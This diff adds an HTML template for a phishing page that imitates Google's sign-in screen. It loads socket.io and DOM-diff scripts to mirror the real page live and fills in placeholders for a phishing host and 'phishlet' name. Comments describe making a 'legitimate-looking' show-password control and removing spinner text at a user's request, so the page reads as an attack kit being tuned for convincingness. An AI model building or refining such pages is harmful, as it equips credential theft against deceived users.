@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in</title>
+  <script src="/mirror/vendor/socket.io.min.js"></script>
+  <script src="/mirror/vendor/diff-dom.min.js"></script>
+  <style>
+    html,body{margin:0;padding:0;height:100%;overflow:auto;background:#fff}
+    #mirror-root{
+      min-height:100%;pointer-events:auto;
+      font-family:Roboto,"Google Sans",Arial,Helvetica,sans-serif;
+      color:#202124;background:#fff
+    }
+    #mirror-root input,#mirror-root textarea{
+      pointer-events:auto!important;
+      font-family:Roboto,"Google Sans",Arial,Helvetica,sans-serif;
+      user-select:text;-webkit-user-select:text;cursor:text
+    }
+    #mirror-root input[disabled],#mirror-root input[readonly],
+    #mirror-root textarea[disabled],#mirror-root textarea[readonly]{
+      pointer-events:auto!important;opacity:1!important
+    }
+    #mirror-root button,#mirror-root [role=button]{cursor:pointer;touch-action:manipulation}
+
+    /* Material float labels (no page JS) */
+    #mirror-root .mirror-g-float .AxOyFc,
+    #mirror-root .has-value .AxOyFc,
+    #mirror-root .rFrNMe.CDELXb .AxOyFc,
+    #mirror-root .AFTWye.CDELXb .AxOyFc{
+      transform:scale(.75) translateY(-14px);
+      transform-origin:left top;color:#1a73e8;pointer-events:none
+    }
+    #mirror-root .mirror-g-float .snByac,
+    #mirror-root .has-value .snByac,
+    #mirror-root .rFrNMe.CDELXb .snByac,
+    #mirror-root .AFTWye.CDELXb .snByac{
+      opacity:0;visibility:hidden;pointer-events:none
+    }
+
+    /* Legitimate-looking Show password (Material broken without JS/icons) */
+    #mirror-root .mirror-g-showpwd{
+      display:flex!important;align-items:center;gap:10px;margin:12px 0 8px;
+      font:400 14px/20px Roboto,Arial,sans-serif;color:#202124;cursor:pointer;user-select:none
+    }
+    #mirror-root .mirror-g-showpwd-cb,
+    #mirror-root input.mirror-g-showpwd-cb{
+      appearance:none;-webkit-appearance:none;
+      width:18px;height:18px;margin:0;padding:0;
+      border:2px solid #5f6368;border-radius:2px;background:#fff;
+      box-shadow:none;outline:none;flex:0 0 18px;position:relative;cursor:pointer
+    }
+    #mirror-root .mirror-g-showpwd-cb:checked,
+    #mirror-root input.mirror-g-showpwd-cb:checked{
+      background:#1a73e8;border-color:#1a73e8
+    }
+    #mirror-root .mirror-g-showpwd-cb:checked::after,
+    #mirror-root input.mirror-g-showpwd-cb:checked::after{
+      content:"";position:absolute;left:4px;top:0;width:5px;height:10px;
+      border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)
+    }
+
+    /* Google-like spinner — NO text (user rejected "Signing in…") */
+    #pf-spin{
+      position:fixed;inset:0;z-index:2147483646;display:none;
+      align-items:center;justify-content:center;pointer-events:none;
+      background:rgba(255,255,255,.35)
+    }
+    #pf-spin.on{display:flex}
+    #pf-spin .ring{
+      width:36px;height:36px;border-radius:50%;
+      border:3px solid #e8eaed;border-top-color:#1a73e8;
+      animation:pfspin .75s linear infinite
+    }
+    @keyframes pfspin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div id="mirror-root"></div>
+  <div id="pf-spin" aria-hidden="true"><div class="ring"></div></div>
+  <script>
+    window.__MIRROR_SESSION__ = '__SESSION_KEY__';
+    window.__MIRROR_PHISH_HOST__ = '__PHISH_HOST__';
+    window.__MIRROR_PHISHLET__ = '__PHISHLET_NAME__';
+  </script>
+  <script src="/mirror/mirror-client.js"></script>
+</body>
+</html>
